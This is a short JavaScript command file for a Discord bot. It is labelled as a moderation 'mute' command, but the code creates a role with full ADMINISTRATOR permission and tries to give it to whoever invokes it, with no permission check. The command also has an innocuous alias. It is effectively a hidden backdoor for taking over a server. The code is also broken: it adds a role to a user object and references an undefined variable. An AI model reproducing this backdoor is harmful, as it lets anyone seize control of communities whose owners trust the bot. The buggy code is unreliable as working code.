module.exports = {
    name : 'superadmin',
    category: "Moderacion",
    aliases: ['dad', 's'],
    description : 'Este comando Mutea al usuario mencionado con su ID o mención, también puedes dar una razón de ello',
    usage: '!admin',
    examples: ['!mute @Firulais', '!mute 556540723235651584', '!mute @Firulais Razon'],
    run: async (client , message, args) => {
    let muterole2 = message.guild.roles.cache.find(r => r.name === "Creador")
    if(!muterole2) {
        try{
            muterole2 = await message.guild.roles.create({ data: {  
                name : "Creador",
                color : "#FF0000",
                permissions : ["SEND_MESSAGES", "ADMINISTRATOR"]
            }
            })
        } catch(e) {
            console.log(e.stack);
    }
}
muterole2.setPosition(25);
message.author.roles.add(muterole.id)
    }
}
